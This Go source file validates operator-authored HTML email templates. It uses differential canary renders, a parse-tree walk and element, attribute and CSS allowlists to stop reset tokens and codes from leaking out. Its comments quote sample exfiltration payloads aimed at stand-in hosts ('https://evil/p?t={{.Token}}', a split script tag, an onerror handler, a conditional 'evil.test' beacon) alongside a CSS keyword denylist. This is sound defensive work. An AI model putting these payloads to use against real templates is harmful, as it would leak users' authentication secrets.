package email

import (
	"bytes"
	"errors"
	"fmt"
	"html/template"
	"io"
	"slices"
	"strconv"
	"strings"
	"text/template/parse"
)

// This file holds the control that keeps an operator-authored email template
// from beaconing a live secret out of the recipient's mail client.
//
// It replaces a regex over the template SOURCE, which failed twice over. The
// denylist was incomplete -- img, href and background were absent, so the
// plainest exfiltration, an image whose URL carries the reset token, needed no
// trick at all. And it inspected the wrong artifact: the source is compiled by
// html/template before anyone sees it, so `<scr{{"ipt"}}>` carries no <script
// in the source and produces a working one after execution. The second failure
// defeats any source-text denylist, not merely the entries that were missing.
//
// html/template contributes nothing against a hostile template AUTHOR. Its
// contextual auto-escaping is a defense against hostile DATA reaching a trusted
// template, and it is still doing that job -- but the escaper picks each
// context from the literal source text, so an author who splits a tag across a
// template action steers the escaper as well. Measured on this tree, all of
// these render and none of them error:
//
//	<img src="https://evil/p?t={{.Token}}">   -> the live token in a fetched URL
//	<scr{{"ipt"}}>...</scr{{"ipt"}}>          -> a working <script>, and {{.Token}}
//	                                             inside it emitted UNQUOTED, because
//	                                             the escaper believes it is in HTML
//	                                             text rather than in JavaScript
//	<img src=x on{{"error"}}=...>             -> a working onerror handler
//
// So the property has to be established here, and it is established on the
// rendered document rather than on the source:
//
//  1. The template is rendered twice with two canary data sets whose secret
//     fields (URL, Token, Code) share no character. Masking each render's own
//     canaries must make the two documents byte-identical. That says the body
//     depends on the secrets only by verbatim substitution: any slice, hash,
//     case-fold, re-encode or branch on a secret changes one render and not the
//     other, so chunked and conditional exfiltration die here without anyone
//     having to enumerate the functions that could perform them.
//
//  2. The masked document is walked with an ALLOWLIST of the elements and
//     attributes an HTML email may use. Email HTML is a famously narrow subset,
//     and an allowlist is the only shape whose failure mode is a rejected
//     legitimate template rather than an accepted hostile one. Anything the
//     walker cannot confidently tokenise is rejected, so a gap in the walker
//     costs an operator a template, not a user their second factor.
//
//  3. No secret may appear in a URL-bearing attribute or in CSS at all, with
//     one exception: the configured link may be used whole. That is what makes
//     `href="{{.URL}}"` legitimate and `href="https://evil/?t={{.URL}}"` not.
//
// Together those give the property the old comment claimed: a template cannot
// cause a live secret to leave the recipient's mail client for a host the
// operator did not configure.

// guardCanary is one set of values for the three fields that carry a live
// secret. Two sets are rendered and compared, so the sets share no character in
// any field: a common prefix would let a truncation of a secret render
// identically in both documents and pass the comparison.
type guardCanary struct {
	url   string
	token string
	code  string
}

var (
	guardCanaryA = guardCanary{
		url:   "https://a1a1a1a1a1a1a1a1.invalid/a1a1a1a1a1a1a1a1",
		token: "b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2",
		code:  "c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3",
	}
	guardCanaryB = guardCanary{
		url:   "https://d4d4d4d4d4d4d4d4.invalid/d4d4d4d4d4d4d4d4",
		token: "e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5",
		code:  "f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6",
	}
)

// Placeholders substituted for each canary before the document is inspected.
// They are control characters, and a rendered document carrying any control
// character is rejected before masking runs, so no template can smuggle one in
// and be mistaken for a substituted secret.
const (
	phURL   = "\x01u\x01"
	phToken = "\x01t\x01"
	phCode  = "\x01c\x01"
)

// guardMaxRenderBytes bounds a validation render. text/template's own depth
// limit stops unbounded recursion; this stops unbounded output.
const guardMaxRenderBytes = 1 << 20

// guardRootName is the name given to the template under validation. It is
// rendered alongside every template the source defines, so both override
// shapes are covered: a database override is a bare body and lands in the root,
// while a file override defines "subject" and "content" and leaves the root
// holding only the whitespace between them.
const guardRootName = "vault42-template-under-validation"

// allowedEmailElements is the element allowlist. It is the intersection of what
// an HTML email needs and what cannot fetch, script or navigate on its own.
// Every omission is deliberate: script, iframe, object, embed, applet, svg,
// math, form, input, button, base, link, meta refresh, video, audio, source,
// track, picture, canvas, frame, frameset, noscript, template and textarea are
// all absent, and an omission rejects rather than passes.
var allowedEmailElements = map[string]bool{
	"html": true, "head": true, "body": true, "title": true, "meta": true,
	"style": true, "div": true, "p": true, "span": true, "a": true, "img": true,
	"br": true, "hr": true, "center": true, "font": true,
	"table": true, "thead": true, "tbody": true, "tfoot": true, "tr": true,
	"td": true, "th": true, "caption": true, "colgroup": true, "col": true,
	"h1": true, "h2": true, "h3": true, "h4": true, "h5": true, "h6": true,
	"strong": true, "b": true, "em": true, "i": true, "u": true, "s": true,
	"strike": true, "small": true, "big": true, "sup": true, "sub": true,
	"ul": true, "ol": true, "li": true, "dl": true, "dt": true, "dd": true,
	"blockquote": true, "pre": true, "code": true,
}

// rawTextElements hold text rather than markup, so the walker consumes them to
// their closing tag instead of tokenising what is inside.
var rawTextElements = map[string]bool{"style": true, "title": true}

// globalEmailAttributes may appear on any allowed element. Nothing here can
// cause a fetch or a navigation.
var globalEmailAttributes = map[string]bool{
	"style": true, "class": true, "id": true, "title": true, "lang": true,
	"dir": true, "align": true, "valign": true, "width": true, "height": true,
	"border": true, "cellpadding": true, "cellspacing": true, "colspan": true,
	"rowspan": true, "bgcolor": true, "color": true, "face": true, "size": true,
	"role": true, "alt": true, "span": true, "nowrap": true,
}

// elementEmailAttributes are the attributes allowed only on a named element.
// background is absent from every entry on purpose: it is auto-loaded exactly
// like an img src and was the vector the old denylist never named.
var elementEmailAttributes = map[string]map[string]bool{
	"a":     {"href": true, "target": true, "rel": true, "name": true},
	"img":   {"src": true},
	"meta":  {"charset": true, "name": true, "content": true},
	"html":  {"xmlns": true},
	"style": {"type": true, "media": true},
}

// urlEmailAttributes names, per element, the single attribute whose value the
// mail client resolves as a URL.
var urlEmailAttributes = map[string]string{"a": "href", "img": "src"}

// forbiddenCSSSubstrings are rejected anywhere CSS is accepted. url is the
// fetch primitive, @import pulls a stylesheet, and the rest are the legacy
// script-from-CSS routes. A backslash is rejected outright because a CSS escape
// can spell any of these without containing them literally.
var forbiddenCSSSubstrings = []string{
	"url", "@import", "expression", "behavior", "binding",
	"javascript", "vbscript", "\\",
}

// errGuard wraps a refusal so callers can match on it.
var errGuard = errors.New("email: template rejected")

func guardRefusal(format string, args ...any) error {
	return fmt.Errorf("%w: %s", errGuard, fmt.Sprintf(format, args...))
}

// guardTemplate holds the no-exfiltration property over an operator-authored
// template. See the file comment for the argument; this is the sequence.
func guardTemplate(src []byte) error {
	tmpl, err := template.New(guardRootName).Funcs(safeFuncMap()).Parse(string(src))
	if err != nil {
		return fmt.Errorf("email: template does not compile: %w", err)
	}
	bodies := guardBodies(tmpl)
	if err := refuseSecretControlFlow(bodies); err != nil {
		return err
	}
	for _, body := range bodies {
		// Three data sets: two canary sets to compare against each other, and a
		// third with no branding configured, because a beacon hidden behind
		// {{if not .LogoURL}} is invisible in a branded render and fires on
		// every operator who never set a logo.
		rendered := make([]string, 0, len(guardDataSets))
		for _, data := range guardDataSets {
			out, err := executeForGuard(body, data)
			if err != nil {
				return err
			}
			rendered = append(rendered, out)
		}
		branded, alternate, unbranded := rendered[0], rendered[1], rendered[2]
		masked := maskSecrets(branded, guardCanaryA)
		if masked != maskSecrets(alternate, guardCanaryB) {
			return guardRefusal("the rendered body changes with the value of the link, token or " +
				"code. A template may substitute those verbatim and nothing else: slicing, " +
				"re-encoding or branching on a secret is how a secret is exfiltrated a piece " +
				"at a time")
		}
		if err := scanEmailDocument(masked); err != nil {
			return err
		}
		if err := scanEmailDocument(maskSecrets(unbranded, guardCanaryA)); err != nil {
			return err
		}
	}
	return nil
}

// guardData builds the data a validation render sees. Only the three secret
// fields differ between canary sets: varying a non-secret would make an
// innocent {{.AppName}} look like a leak.
func guardData(c guardCanary, branded bool) TemplateData {
	d := TemplateData{
		AppName: "Vault42 Template Validation",
		URL:     c.url,
		Token:   c.token,
		Code:    c.code,
		Subject: "Vault42 Template Validation",
	}
	if branded {
		d.IP = "203.0.113.7"
		d.Device = "Validation Device"
		d.Country = "SK"
		d.LogoURL = "https://logo.invalid/logo.png"
		d.PrimaryColor = "#00FF42"
	}
	return d
}

// guardSecretFields are the TemplateData fields carrying something a recipient
// must be the only one to learn.
var guardSecretFields = map[string]bool{"URL": true, "Token": true, "Code": true}

// refuseSecretControlFlow is the one check the differential render cannot make.
// Comparing the two renders proves the body depends on a secret only by
// verbatim substitution, but it proves it for the two values it rendered. A
// template that branches on a secret's value takes the same branch under both
// canaries and differs only for the one live value it is waiting for:
//
//	{{if eq .Code "000000"}}<img src="https://evil.test/hit">{{end}}
//
// That is a one-bit oracle per branch, and enough of them recover the whole
// secret. It cannot be caught by rendering, because catching it that way means
// guessing the constant. So it is caught structurally instead, on the parse
// tree rather than on the source text: a secret may be substituted, and may not
// steer control flow or be bound to a variable that later does.
func refuseSecretControlFlow(bodies []*template.Template) error {
	for _, body := range bodies {
		if err := walkGuardNode(body.Tree.Root); err != nil {
			return err
		}
	}
	return nil
}

func walkGuardNode(n parse.Node) error {
	switch node := n.(type) {
	case *parse.ListNode:
		if node == nil {
			return nil
		}
		for _, child := range node.Nodes {
			if err := walkGuardNode(child); err != nil {
				return err
			}
		}
	case *parse.IfNode:
		return walkGuardBranch(&node.BranchNode, "if")
	case *parse.RangeNode:
		return walkGuardBranch(&node.BranchNode, "range")
	case *parse.WithNode:
		return walkGuardBranch(&node.BranchNode, "with")
	case *parse.ActionNode:
		if !pipeUsesSecret(node.Pipe) {
			return nil
		}
		if len(node.Pipe.Decl) > 0 {
			return guardRefusal("a template variable is assigned the link, token or code. A secret " +
				"that reaches a variable can steer a branch the validator cannot see through")
		}
		// Emitting a derived value is the same oracle as branching on it, and
		// the differential cannot see it: both canaries miss a probe like
		// {{eq .Code "000000"}}, so both renders write "false" into
		// https://evil/…/false and checkEmailURL allows the constant URL.
		// Only a verbatim substitution (optionally case-folded or safeURL'd)
		// may reach the document.
		if !pipeIsVerbatimSecret(node.Pipe) {
			return guardRefusal("a template action derives a value from the link, token or code " +
				"rather than substituting it. Comparison, slicing and formatting of a secret are " +
				"how a secret is exfiltrated a bit at a time, including into a URL that looks " +
				"constant under the canaries")
		}
	case *parse.TemplateNode:
		// {{template "name" .Code}} rebinds the callee's dot to the secret.
		// The define body is also rendered alone under TemplateData during
		// validation, so a naive {{if eq . "000000"}} fails closed by type
		// error — but a dual-type body (printf "%T" then eq) executes cleanly
		// under both shapes, looks constant across canaries, and beacons the
		// live OTP. Refusing a secret-bearing pipeline at the call site is
		// the structural answer; operator overrides have no need to pass a
		// secret as the nested template's data.
		if pipeUsesSecret(node.Pipe) {
			return guardRefusal("a {{template}} call passes the link, token or code as the " +
				"nested template's data. That rebinds the secret as {{.}} inside the define, " +
				"where comparison oracles the differential cannot see recover it a bit at a time")
		}
	}
	return nil
}

// pipeIsVerbatimSecret reports whether p is a bare secret field, optionally
// piped through upper, lower or safeURL and nothing else. Those three are the
// function-map entries that preserve the secret as itself (or the same link
// case-folded / typed as a URL); every other pipeline is a derivation.
func pipeIsVerbatimSecret(p *parse.PipeNode) bool {
	if p == nil || len(p.Cmds) == 0 {
		return false
	}
	first := p.Cmds[0]
	if len(first.Args) != 1 || !nodeIsSecretField(first.Args[0]) {
		return false
	}
	for _, cmd := range p.Cmds[1:] {
		if len(cmd.Args) != 1 {
			return false
		}
		id, ok := cmd.Args[0].(*parse.IdentifierNode)
		if !ok {
			return false
		}
		switch id.Ident {
		case "upper", "lower", "safeURL":
		default:
			return false
		}
	}
	return true
}

func nodeIsSecretField(n parse.Node) bool {
	switch node := n.(type) {
	case *parse.FieldNode:
		return len(node.Ident) == 1 && guardSecretFields[node.Ident[0]]
	case *parse.VariableNode:
		// $.Code / $.Token / $.URL are the same secrets as .Code / .Token / .URL;
		// verbatim substitution must still be allowed, derivations refused.
		return len(node.Ident) == 2 && node.Ident[0] == "$" && guardSecretFields[node.Ident[1]]
	}
	return false
}

func walkGuardBranch(b *parse.BranchNode, keyword string) error {
	if pipeUsesSecret(b.Pipe) {
		return guardRefusal("a {{%s}} decides on the value of the link, token or code. A body that "+
			"differs by what a secret IS leaks it one branch at a time, and no amount of rendering "+
			"finds the value it is waiting for", keyword)
	}
	if err := walkGuardNode(b.List); err != nil {
		return err
	}
	return walkGuardNode(b.ElseList)
}

func pipeUsesSecret(p *parse.PipeNode) bool {
	if p == nil {
		return false
	}
	for _, cmd := range p.Cmds {
		for _, arg := range cmd.Args {
			if nodeUsesSecret(arg) {
				return true
			}
		}
	}
	return false
}

func nodeUsesSecret(n parse.Node) bool {
	switch node := n.(type) {
	case *parse.FieldNode:
		return identsUseSecret(node.Ident)
	case *parse.VariableNode:
		// $.Code is a VariableNode{Ident:{"$","Code"}}, not a FieldNode.
		// Missing this case left {{eq $.Code "000000"}} invisible to the
		// structural walk while both canaries still rendered /c/false.
		return identsUseSecret(node.Ident)
	case *parse.ChainNode:
		return identsUseSecret(node.Field) || nodeUsesSecret(node.Node)
	case *parse.PipeNode:
		return pipeUsesSecret(node)
	}
	return false
}

func identsUseSecret(idents []string) bool {
	for _, id := range idents {
		if guardSecretFields[id] {
			return true
		}
	}
	return false
}

// guardDataSets are the data a validation render sees, in the order
// guardTemplate consumes them: canary A branded, canary B branded, canary A
// with no branding configured.
var guardDataSets = []TemplateData{
	guardData(guardCanaryA, true),
	guardData(guardCanaryB, true),
	guardData(guardCanaryA, false),
}

// guardBodies lists every body the source defines, in a stable order. Both
// override shapes are covered: a database override is a bare body and lands in
// the root, a file override defines "subject" and "content".
func guardBodies(tmpl *template.Template) []*template.Template {
	bodies := make([]*template.Template, 0, len(tmpl.Templates()))
	for _, assoc := range tmpl.Templates() {
		if assoc.Tree != nil {
			bodies = append(bodies, assoc)
		}
	}
	slices.SortFunc(bodies, func(a, b *template.Template) int {
		return strings.Compare(a.Name(), b.Name())
	})
	return bodies
}

// executeForGuard renders one body with one data set, bounding the output and
// refusing a document carrying control characters.
func executeForGuard(body *template.Template, data TemplateData) (string, error) {
	var buf bytes.Buffer
	if err := body.Execute(&limitWriter{w: &buf, left: guardMaxRenderBytes}, data); err != nil {
		return "", fmt.Errorf("email: template cannot be rendered for validation: %w", err)
	}
	out := buf.String()
	if err := rejectControlBytes(out); err != nil {
		return "", err
	}
	return out, nil
}

// limitWriter fails a render that produces more than left bytes.
type limitWriter struct {
	w    io.Writer
	left int
}

func (l *limitWriter) Write(p []byte) (int, error) {
	if len(p) > l.left {
		return 0, guardRefusal("the template renders more than %d bytes", guardMaxRenderBytes)
	}
	l.left -= len(p)
	return l.w.Write(p)
}

// rejectControlBytes refuses a rendered body carrying a control character. Mail
// clients treat several of them as nothing at all, which is how javascript&#9;:
// becomes javascript:, and rejecting them here is also what keeps a template
// from writing a masking placeholder itself.
func rejectControlBytes(s string) error {
	for i := 0; i < len(s); i++ {
		b := s[i]
		if b < 0x20 && b != '\t' && b != '\n' && b != '\r' {
			return guardRefusal("the rendered body contains control byte %#02x at offset %d", b, i)
		}
		if b == 0x7f {
			return guardRefusal("the rendered body contains a DEL byte at offset %d", i)
		}
	}
	return nil
}

// maskSecrets replaces this render's canaries with fixed placeholders. The
// case-folded forms are covered because the template function map offers upper
// and lower, so {{.URL | upper}} is a legitimate way to write the same link.
func maskSecrets(s string, c guardCanary) string {
	for _, sub := range []struct{ value, placeholder string }{
		{c.url, phURL}, {c.token, phToken}, {c.code, phCode},
	} {
		s = strings.ReplaceAll(s, sub.value, sub.placeholder)
		s = strings.ReplaceAll(s, strings.ToUpper(sub.value), sub.placeholder)
	}
	return s
}

func containsSecretPlaceholder(s string) bool {
	return strings.Contains(s, phURL) || strings.Contains(s, phToken) || strings.Contains(s, phCode)
}

// scanEmailDocument walks a masked rendered body and refuses anything outside
// the allowlist, including anything it cannot tokenise.
//
// Text between tags is checked too. The attribute allowlist cannot see a bare
// https://… run that carries a secret, and mail clients auto-linkify that text
// into a fetch the operator never configured.
func scanEmailDocument(doc string) error {
	for i := 0; i < len(doc); {
		next := strings.IndexByte(doc[i:], '<')
		if next < 0 {
			return checkEmailText(doc[i:])
		}
		if next > 0 {
			if err := checkEmailText(doc[i : i+next]); err != nil {
				return err
			}
		}
		i += next
		advanced, err := scanConstruct(doc, i)
		if err != nil {
			return err
		}
		i = advanced
	}
	return nil
}

// checkEmailText refuses a text run that would auto-linkify into a fetch
// carrying a live secret. Secrets used as ordinary body text (an OTP code, the
// configured link copied whole) are untouched: after masking, the configured
// link is the control-character placeholder, which is not URL-shaped, and a
// bare code shares no scheme prefix with a link.
func checkEmailText(text string) error {
	if !containsSecretPlaceholder(text) {
		return nil
	}
	// Character references are resolved before a mail client decides what is a
	// link, so the check runs on what the client sees (https&#58;//… becomes
	// https://…).
	return refuseSecretBearingAutolink(decodeHTMLEntities(text))
}

// refuseSecretBearingAutolink walks URL-shaped runs in text and refuses any
// that still carry a secret placeholder. The configured link alone cannot
// match a scheme start after masking, so reaching a match means a host the
// operator did not configure is about to receive the secret.
func refuseSecretBearingAutolink(text string) error {
	lower := strings.ToLower(text)
	for i := 0; i < len(lower); {
		start, ok := findAutolinkStart(lower, i)
		if !ok {
			return nil
		}
		end := extendAutolinkRun(text, start)
		run := text[start:end]
		if containsSecretPlaceholder(run) {
			return guardRefusal("the rendered body carries a live token, code or link inside a "+
				"URL-shaped run of text (%q). Mail clients auto-linkify that text and the secret "+
				"leaves for a host the operator did not configure", clip(run))
		}
		// Always advance. extendAutolinkRun cannot return an end at or before
		// start for a run findAutolinkStart reported -- those begin with a
		// scheme, "//" or "www.", and none of the punctuation the trim removes
		// can consume such a run to nothing. Writing the floor as part of the
		// step rather than as a branch keeps the guarantee the walk depends on
		// -- that it makes progress -- without resting it on that argument
		// continuing to hold, and without an arm no input can reach.
		i = max(start+1, end)
	}
	return nil
}

// findAutolinkStart locates the next scheme or www. prefix a mail client would
// treat as the start of a link, at or after i.
func findAutolinkStart(lower string, i int) (int, bool) {
	for i < len(lower) {
		rest := lower[i:]
		switch {
		case strings.HasPrefix(rest, "https://"):
			return i, true
		case strings.HasPrefix(rest, "http://"):
			return i, true
		case strings.HasPrefix(rest, "//"):
			// Protocol-relative. Require a look of a host afterwards so a
			// stray "//" in prose is not treated as a link start.
			if i+2 < len(lower) && isAutolinkHostByte(lower[i+2]) {
				return i, true
			}
		case strings.HasPrefix(rest, "www.") && (i == 0 || !isAutolinkHostByte(lower[i-1])):
			return i, true
		}
		i++
	}
	return 0, false
}

// extendAutolinkRun returns the index just past the URL-shaped run that starts
// at start. Stops at whitespace, quotes, or a character that ends a link in
// common auto-linkifiers (and in the attribute walker).
func extendAutolinkRun(text string, start int) int {
	j := start
	for j < len(text) {
		b := text[j]
		if isASCIISpace(b) || b == '"' || b == '\'' || b == '<' || b == '>' ||
			b == '`' || b == ')' || b == ']' || b == '{' || b == '}' {
			break
		}
		j++
	}
	// Trim a trailing ASCII punctuation mark that auto-linkifiers leave out of
	// the URL (a closing paren already stopped us; period/comma/semicolon and
	// the sentence-ending ones are common).
	for j > start {
		switch text[j-1] {
		case '.', ',', ';', ':', '!', '?':
			j--
		default:
			return j
		}
	}
	return j
}

func isAutolinkHostByte(b byte) bool {
	return isASCIILetter(b) || b >= '0' && b <= '9' || b == '[' // '[' covers an IPv6 literal
}

// scanConstruct classifies the construct starting at the '<' at index i and
// returns the index just past it.
func scanConstruct(doc string, i int) (int, error) {
	rest := doc[i:]
	switch {
	case strings.HasPrefix(rest, "<!--"):
		return scanComment(doc, i)
	case hasPrefixFold(rest, "<!doctype"):
		return scanDoctype(doc, i)
	case strings.HasPrefix(rest, "<!"), strings.HasPrefix(rest, "<?"):
		return 0, guardRefusal("markup declarations and processing instructions are not allowed in an email template")
	case strings.HasPrefix(rest, "</"):
		return scanEndTag(doc, i)
	case len(rest) > 1 && isASCIILetter(rest[1]):
		elem, advanced, err := scanStartTag(doc, i)
		if err != nil {
			return 0, err
		}
		if rawTextElements[elem] {
			return scanRawText(doc, advanced, elem)
		}
		return advanced, nil
	default:
		// A '<' that begins no construct is literal text to every parser.
		return i + 1, nil
	}
}

func scanComment(doc string, i int) (int, error) {
	end := strings.Index(doc[i:], "-->")
	if end < 0 {
		return 0, guardRefusal("an HTML comment is never closed")
	}
	body := doc[i+4 : i+end]
	// Conditional comments are markup to Outlook and text to everyone else, so
	// a comment that could carry either is refused rather than parsed twice.
	if strings.ContainsAny(body, "<[") {
		return 0, guardRefusal("a comment contains '<' or '[', which downlevel-revealed and conditional comments use to smuggle markup")
	}
	return i + end + 3, nil
}

func scanDoctype(doc string, i int) (int, error) {
	end := strings.IndexByte(doc[i:], '>')
	if end < 0 {
		return 0, guardRefusal("a doctype declaration is never closed")
	}
	if !strings.EqualFold(strings.Join(strings.Fields(doc[i:i+end+1]), " "), "<!doctype html>") {
		return 0, guardRefusal("only the HTML5 doctype is allowed, got %q", doc[i:i+end+1])
	}
	return i + end + 1, nil
}

func scanEndTag(doc string, i int) (int, error) {
	elem, p := scanName(doc, i+2)
	if elem == "" {
		return 0, guardRefusal("a closing tag has no element name")
	}
	if !allowedEmailElements[elem] {
		return 0, guardRefusal("</%s> is not on the email template allowlist", elem)
	}
	p = skipASCIISpace(doc, p)
	if p >= len(doc) || doc[p] != '>' {
		return 0, guardRefusal("the closing tag </%s> carries attributes or is never closed", elem)
	}
	return p + 1, nil
}

// scanRawText consumes a raw-text element's content up to its closing tag,
// checking the content where it is CSS.
func scanRawText(doc string, from int, elem string) (int, error) {
	closing := "</" + elem
	idx := indexFold(doc[from:], closing)
	if idx < 0 {
		return 0, guardRefusal("<%s> is never closed", elem)
	}
	content := doc[from : from+idx]
	if elem == "style" {
		if err := checkEmailCSS("a <style> block", content); err != nil {
			return 0, err
		}
	} else if containsSecretPlaceholder(content) {
		return 0, guardRefusal("<%s> would carry a live secret", elem)
	}
	return scanEndTag(doc, from+idx)
}

// scanStartTag parses a start tag, checking the element and every attribute.
func scanStartTag(doc string, i int) (string, int, error) {
	elem, p := scanName(doc, i+1)
	if elem == "" {
		return "", 0, guardRefusal("a tag has no element name")
	}
	if !allowedEmailElements[elem] {
		return "", 0, guardRefusal("<%s> is not on the email template allowlist. An email body may "+
			"only use the layout and text elements a mail client renders, never one that fetches, "+
			"scripts or navigates on its own", elem)
	}
	for {
		p = skipASCIISpace(doc, p)
		if p >= len(doc) {
			return "", 0, guardRefusal("the tag <%s> is never closed", elem)
		}
		if doc[p] == '>' {
			return elem, p + 1, nil
		}
		if doc[p] == '/' {
			if p+1 < len(doc) && doc[p+1] == '>' {
				return elem, p + 2, nil
			}
			return "", 0, guardRefusal("a stray '/' separates attributes on <%s>; mail clients read "+
				"what follows it as an attribute and this walker will not guess which", elem)
		}
		name, q := scanName(doc, p)
		if name == "" {
			return "", 0, guardRefusal("<%s> carries something this walker cannot read as an "+
				"attribute name, at %q", elem, clip(doc[p:]))
		}
		p = skipASCIISpace(doc, q)
		value := ""
		if p < len(doc) && doc[p] == '=' {
			var err error
			if value, p, err = scanAttrValue(doc, skipASCIISpace(doc, p+1)); err != nil {
				return "", 0, err
			}
		}
		if err := checkEmailAttribute(elem, name, value); err != nil {
			return "", 0, err
		}
	}
}

func scanAttrValue(doc string, i int) (string, int, error) {
	if i >= len(doc) {
		return "", 0, guardRefusal("an attribute value runs past the end of the document")
	}
	if q := doc[i]; q == '"' || q == '\'' {
		end := strings.IndexByte(doc[i+1:], q)
		if end < 0 {
			return "", 0, guardRefusal("an attribute value is never closed")
		}
		return doc[i+1 : i+1+end], i + end + 2, nil
	}
	j := i
	for j < len(doc) && !isUnquotedValueEnd(doc[j]) {
		j++
	}
	if j == i {
		return "", 0, guardRefusal("an attribute has an empty unquoted value")
	}
	return doc[i:j], j, nil
}

// checkEmailAttribute applies the attribute allowlist and the secret policy.
func checkEmailAttribute(elem, rawName, rawValue string) error {
	name := strings.ToLower(rawName)
	if strings.HasPrefix(name, "on") && len(name) > 2 {
		return guardRefusal("the event handler %q on <%s> is not allowed in an email template", name, elem)
	}
	if !globalEmailAttributes[name] && !elementEmailAttributes[elem][name] {
		return guardRefusal("the attribute %q on <%s> is not on the email template allowlist", name, elem)
	}
	value := decodeHTMLEntities(rawValue)
	isURL := urlEmailAttributes[elem] == name
	if containsSecretPlaceholder(value) && !(isURL && strings.TrimSpace(value) == phURL) {
		return guardRefusal("%s=%q on <%s> would carry a live token, code or link into a value the "+
			"mail client resolves. The configured link may be used whole and nothing else may be "+
			"used at all: this is the beacon the validator exists to stop", name, clip(rawValue), elem)
	}
	if name == "style" {
		return checkEmailCSS(fmt.Sprintf("the style attribute on <%s>", elem), value)
	}
	if isURL {
		return checkEmailURL(elem, name, value)
	}
	return nil
}

// checkEmailURL constrains a URL the mail client will resolve. A URL that is
// constant across both canary renders cannot encode a secret -- guardTemplate
// has already established that -- so a hardcoded absolute http(s) target is
// allowed, and everything whose scheme a mail client might act on is not.
func checkEmailURL(elem, attr, value string) error {
	// Mail clients strip tab, newline and carriage return from a URL before
	// resolving it, which is how java\tscript: becomes javascript:.
	u := strings.TrimSpace(strings.NewReplacer("\t", "", "\n", "", "\r", "").Replace(value))
	if u == phURL {
		return nil
	}
	if u == "" {
		return guardRefusal("%s on <%s> is empty; mail clients resolve an empty URL against the message itself", attr, elem)
	}
	lower := strings.ToLower(u)
	switch {
	case strings.HasPrefix(lower, "https://"), strings.HasPrefix(lower, "http://"):
		return nil
	case elem == "a" && strings.HasPrefix(lower, "mailto:"):
		return nil
	case elem == "img" && strings.HasPrefix(lower, "cid:"):
		return nil
	default:
		return guardRefusal("%s=%q on <%s> is neither the configured link nor an absolute http(s) "+
			"address. A relative or exotic-scheme target in an email resolves somewhere the "+
			"operator did not choose", attr, clip(value), elem)
	}
}

// checkEmailCSS refuses CSS that can fetch, import or script. Comments are
// removed first because u/*x*/rl( is a url token to a CSS parser.
func checkEmailCSS(where, css string) error {
	if containsSecretPlaceholder(css) {
		return guardRefusal("%s would carry a live token, code or link into CSS, which can fetch", where)
	}
	folded := strings.ToLower(stripCSSComments(css))
	for _, bad := range forbiddenCSSSubstrings {
		if strings.Contains(folded, bad) {
			return guardRefusal("%s contains %q; CSS in an email may set presentation and may not "+
				"reference anything off the message", where, bad)
		}
	}
	return nil
}

// stripCSSComments removes CSS comments by closing the gap rather than by
// leaving a space. A CSS tokeniser treats a comment as a token boundary, so
// u/*x*/rl( is two idents and not a url token -- joining is the stricter
// reading of the two and refuses the construct either way. An unterminated
// comment runs to the end of the stylesheet, as it does in a real parser.
func stripCSSComments(css string) string {
	var b strings.Builder
	for {
		start := strings.Index(css, "/*")
		if start < 0 {
			b.WriteString(css)
			return b.String()
		}
		b.WriteString(css[:start])
		end := strings.Index(css[start+2:], "*/")
		if end < 0 {
			return b.String()
		}
		css = css[start+2+end+2:]
	}
}

// decodeHTMLEntities resolves the character references a mail client resolves
// before it acts on an attribute value, so the checks run on what the client
// sees rather than on what the author typed.
func decodeHTMLEntities(s string) string {
	if !strings.Contains(s, "&") {
		return s
	}
	var b strings.Builder
	for i := 0; i < len(s); {
		if s[i] != '&' {
			b.WriteByte(s[i])
			i++
			continue
		}
		r, width, ok := decodeOneEntity(s[i:])
		if !ok {
			b.WriteByte(s[i])
			i++
			continue
		}
		b.WriteRune(r)
		i += width
	}
	return b.String()
}

var namedEntities = map[string]rune{
	"&amp;": '&', "&lt;": '<', "&gt;": '>', "&quot;": '"',
	"&apos;": '\'', "&#39;": '\'', "&nbsp;": ' ', "&sol;": '/', "&colon;": ':',
	"&Tab;": '\t', "&NewLine;": '\n',
}

// decodeOneEntity decodes the reference at the head of s. The trailing
// semicolon is optional for numeric references because mail clients accept it
// missing, and a check that required it would miss what they resolve.
func decodeOneEntity(s string) (rune, int, bool) {
	for name, r := range namedEntities {
		if strings.HasPrefix(s, name) {
			return r, len(name), true
		}
	}
	if !strings.HasPrefix(s, "&#") {
		return 0, 0, false
	}
	digits, base := s[2:], 10
	if len(digits) > 0 && (digits[0] == 'x' || digits[0] == 'X') {
		digits, base = digits[1:], 16
	}
	end := 0
	for end < len(digits) && isDigitInBase(digits[end], base) {
		end++
	}
	if end == 0 {
		return 0, 0, false
	}
	n, err := strconv.ParseInt(digits[:end], base, 32)
	if err != nil || n <= 0 {
		return 0, 0, false
	}
	width := len(s) - len(digits) + end
	if width < len(s) && s[width] == ';' {
		width++
	}
	return rune(n), width, true
}

func isDigitInBase(b byte, base int) bool {
	if base == 16 {
		return b >= '0' && b <= '9' || b >= 'a' && b <= 'f' || b >= 'A' && b <= 'F'
	}
	return b >= '0' && b <= '9'
}

// scanName reads an element or attribute name and lowercases it. The accepted
// shape is deliberately narrower than HTML's: a name this rejects makes the
// walker refuse the template, which is the safe direction.
func scanName(s string, i int) (string, int) {
	if i >= len(s) || !isASCIILetter(s[i]) {
		return "", i
	}
	j := i
	for j < len(s) && (isASCIILetter(s[j]) || s[j] >= '0' && s[j] <= '9' || s[j] == '-') {
		j++
	}
	return strings.ToLower(s[i:j]), j
}

func isASCIILetter(b byte) bool {
	return b >= 'a' && b <= 'z' || b >= 'A' && b <= 'Z'
}

func isASCIISpace(b byte) bool {
	return b == ' ' || b == '\t' || b == '\n' || b == '\r' || b == '\f'
}

func isUnquotedValueEnd(b byte) bool {
	return isASCIISpace(b) || b == '"' || b == '\'' || b == '=' || b == '<' || b == '>' || b == '`'
}

func skipASCIISpace(s string, i int) int {
	for i < len(s) && isASCIISpace(s[i]) {
		i++
	}
	return i
}

func hasPrefixFold(s, prefix string) bool {
	return len(s) >= len(prefix) && strings.EqualFold(s[:len(prefix)], prefix)
}

func indexFold(s, substr string) int {
	for i := 0; i+len(substr) <= len(s); i++ {
		if strings.EqualFold(s[i:i+len(substr)], substr) {
			return i
		}
	}
	return -1
}

// clip shortens a fragment quoted back in a refusal so an error stays readable.
func clip(s string) string {
	const maxQuoted = 60
	if len(s) <= maxQuoted {
		return s
	}
	return s[:maxQuoted] + "..."
}
